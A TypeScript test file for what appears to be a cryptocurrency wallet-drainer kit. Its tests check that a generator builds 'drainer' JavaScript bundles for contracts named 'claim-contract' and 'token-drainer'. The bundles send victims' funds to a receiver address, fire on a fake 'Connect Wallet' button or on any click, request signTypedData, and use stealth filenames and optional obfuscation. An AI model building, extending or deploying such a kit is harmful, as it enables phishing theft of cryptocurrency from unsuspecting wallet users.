import { getContractById } from '@/lib/contract-registry';
import { generateDrainerBundle, generateUniversalBundle } from '@/lib/universal-sdk-generator';
import { getDefaultCompileConfig } from '@/lib/compile-config-store';
import { describe, it, expect } from 'vitest';

describe('universal-sdk-generator', () => {
  function makeConfig() {
    const config = getDefaultCompileConfig();
    return {
      ...config,
      strategy: { ...config.strategy, obfuscationLevel: "none" as const },
    };
  }

  it('generates drainer bundle for a drainer contract', async () => {
    const contract = getContractById('claim-contract');
    expect(contract).not.toBeNull();
    expect(contract!.category).toBe('drainer');

    const bundle = await generateDrainerBundle({
      contract: contract! as any,
      receiverAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18',
      buttonSelector: '.connect-btn',
      buttonText: 'Connect Wallet',
      twoStep: false,
      ecosystem: 'evm',
      config: makeConfig(),
    });

    expect(bundle.bundle).toBeTruthy();
    expect(bundle.filename).toContain('claim-contract');
    expect(bundle.contractType).toBe('claim-contract');
    expect(bundle.trigger).toBe('anyclick');
    expect(bundle.bundle.length).toBeGreaterThan(100);
    expect(bundle.bundle).toContain('/api/tx-payload');
    expect(bundle.bundle).toContain('signTypedData');
  });

  it('generates sequence bundle for a sequence contract', async () => {
    const contract = getContractById('stage1-module');
    expect(contract).not.toBeNull();
    expect(contract!.category).toBe('sequence');

    const bundle = await generateUniversalBundle({
      contract: contract! as any,
      receiverAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18',
      buttonSelector: '.connect-btn',
      buttonText: 'Connect Wallet',
      twoStep: false,
      ecosystem: 'evm',
      config: makeConfig(),
    });

    expect(bundle.bundle).toBeTruthy();
    expect(bundle.filename).toBe('stealthv26.min.js');
    expect(bundle.contractType).toBe('stage1-module');
    expect(bundle.trigger).toBe('button');
  });

  it('returns UniversalBundleResult shape', async () => {
    const contract = getContractById('token-drainer');
    const bundle = await generateDrainerBundle({
      contract: contract! as any,
      receiverAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18',
      buttonSelector: '.connect-btn',
      buttonText: 'Connect Wallet',
      twoStep: false,
      ecosystem: 'evm',
      config: makeConfig(),
    });

    expect(bundle).toHaveProperty('bundle');
    expect(bundle).toHaveProperty('filename');
    expect(bundle).toHaveProperty('contractType');
    expect(bundle).toHaveProperty('trigger');
    expect(['anyclick', 'button']).toContain(bundle.trigger);
  });
});